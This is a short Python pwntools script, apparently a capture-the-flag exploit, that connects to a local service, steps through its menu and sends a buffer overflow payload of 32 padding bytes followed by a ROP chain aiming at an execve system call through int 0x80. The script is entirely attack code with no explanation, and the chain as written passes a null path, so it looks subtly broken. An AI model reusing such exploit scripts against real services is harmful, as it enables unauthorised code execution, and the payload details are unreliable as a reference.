
from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)
print io.recv()
io.sendline('a')
print io.recv()
io.sendline('b')
print io.recv()
io.sendline('c')
print io.recv()
io.sendline('y')
print io.recv()
io.sendline('2')
print io.recv()

pop_eax_ebx_esi_edi_ret=0x080a150a
pop_edx_ecx_ebx_ret=0x080733b0
int80h=0x08071005

payload=flat(['A'*32],pop_eax_ebx_esi_edi_ret,0xb,0,0,0,pop_edx_ecx_ebx_ret,0,0,0,int80h)
io.sendline(payload)
